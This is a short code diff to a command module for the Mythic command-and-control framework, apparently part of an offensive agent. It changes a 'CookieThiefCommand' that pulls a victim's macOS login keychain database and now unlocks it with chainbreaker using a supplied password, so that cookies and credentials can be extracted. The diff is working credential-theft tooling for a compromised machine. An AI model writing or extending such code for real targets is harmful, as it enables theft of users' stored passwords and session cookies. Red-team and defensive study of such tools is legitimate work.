@@ -2,7 +2,6 @@ from mythic_payloadtype_container.MythicCommandBase import *
 import json
 import os
 from mythic_payloadtype_container.MythicRPC import *
-#sys.path.append('../chainbreaker')
 import chainbreaker
 
 
@@ -60,6 +59,7 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
+        password = task.args.get_arg("password")
         getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
         if getkeychainDBResp.status == "success":
             getkeychainDBResp = getkeychainDBResp.response[0]
@@ -76,7 +76,8 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
-            chainbreaker.main("-h")
+            keychain = chainbreaker.Chainbreaker("tmp_login.keychain-db", unlock_password=password, unlock_key=None,
+                                    unlock_file=None)
         except Exception as e:
             print("Chainbreaker script failed with error: " + str(e))
             sys.stdout.flush()
